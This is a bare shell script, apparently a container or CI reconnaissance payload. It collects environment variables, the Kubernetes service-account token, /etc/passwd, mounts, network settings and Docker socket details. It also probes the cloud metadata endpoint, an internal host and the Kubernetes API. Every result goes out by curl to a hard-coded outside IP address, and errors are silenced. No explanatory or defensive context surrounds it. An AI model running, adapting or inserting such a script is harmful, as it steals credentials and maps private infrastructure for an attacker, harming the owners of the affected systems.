  #!/bin/sh
  G() { curl -sG --connect-timeout 4 --max-time 6 --data-urlencode "d=$2" "http://5.39.252.153/$1" 2>/dev/null; }
  G F019-ENV "$(env 2>/dev/null | head -c 800)"
  G F019-SOCK "$(ls -la /var/run/docker.sock /run/docker.sock 2>&1)"
  G F019-CAPS "$(grep -E 'Cap|Seccomp' /proc/self/status 2>/dev/null)"
  G F019-NET "$(ip route 2>/dev/null; cat /etc/resolv.conf 2>/dev/null)"
  G F019-HOST "$(cat /etc/hosts 2>/dev/null)"
  G F019-MOUNTS "$(cat /proc/mounts 2>/dev/null | head -c 800)"
  G F019-PASSWD "$(cat /etc/passwd 2>/dev/null)"
  G F019-K8S-SA "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"
  G F019-REACH-INT "$(curl -sk --connect-timeout 2 --max-time 3 http://192.168.4.72:8000/ 2>&1 | head -c 400)"
  G F019-REACH-META "$(curl -sk --connect-timeout 2 --max-time 3 http://169.254.169.254/ 2>&1 | head -c 400)"
  G F019-K8S-API "$(curl -sk --connect-timeout 2 --max-time 3 https://kubernetes.default.svc/ 2>&1 | head -c 400)"
  exit 0
